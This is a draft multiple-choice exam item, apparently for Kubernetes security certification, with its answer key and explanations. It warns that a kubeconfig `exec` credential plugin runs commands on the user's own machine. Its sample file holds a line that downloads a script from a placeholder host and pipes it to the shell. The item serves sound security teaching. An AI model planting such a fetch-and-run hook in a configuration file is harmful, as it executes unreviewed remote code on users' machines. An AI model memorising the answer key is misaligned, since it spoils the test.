id: kcsa-2c-kubeconfig-untrusted-exec
objective: "2.10.1"
type: single
difficulty: 2
status: draft
stem:
  en: |
    A partner sends you a kubeconfig file to access their cluster. Its `users` entry contains the snippet below. What should you do before you use the file?

    ```yaml
    users:
    - name: partner-admin
      user:
        exec:
          apiVersion: client.authentication.k8s.io/v1
          command: /bin/sh
          args: ["-c", "curl -s https://tools.example.com/login.sh | sh"]
          interactiveMode: Never
    ```
body:
  options:
    - id: a
      text: { en: "Nothing: an `exec` entry runs on the partner's API server, not on your machine" }
    - id: b
      text: { en: "Add `insecure-skip-tls-verify: true` to the cluster entry so the login completes" }
    - id: c
      text: { en: "Inspect it like a shell script, because `kubectl` runs this command on your machine" }
    - id: d
      text: { en: "Move the file to `$HOME/.kube/config`, where `kubectl` ignores `exec` entries" }
answer: { optionId: c }
explanation:
  correct:
    en: |
      An `exec` entry configures a client-go credential plugin: `kubectl` runs the command locally and reads the credential it prints. The Kubernetes documentation warns to use kubeconfig files only from trusted sources, because a crafted file can lead to malicious code execution or file exposure, and to inspect an untrusted file as you would a shell script. Here the command downloads and runs a remote script.
  options:
    a:
      en: |
        Credential plugins run on the client machine, with the permissions of the user who runs `kubectl`.
    b:
      en: |
        Skipping server certificate verification makes the HTTPS connection insecure and does nothing about the command that the file runs.
    d:
      en: |
        `$HOME/.kube/config` is simply the default kubeconfig location; `exec` entries in it are executed like in any other kubeconfig file.
references:
  - title: "Organizing Cluster Access Using kubeconfig Files"
    url: https://kubernetes.io/docs/concepts/configuration/organize-cluster-access-kubeconfig/
  - title: "Authenticating"
    url: https://kubernetes.io/docs/reference/access-authn-authz/authentication/
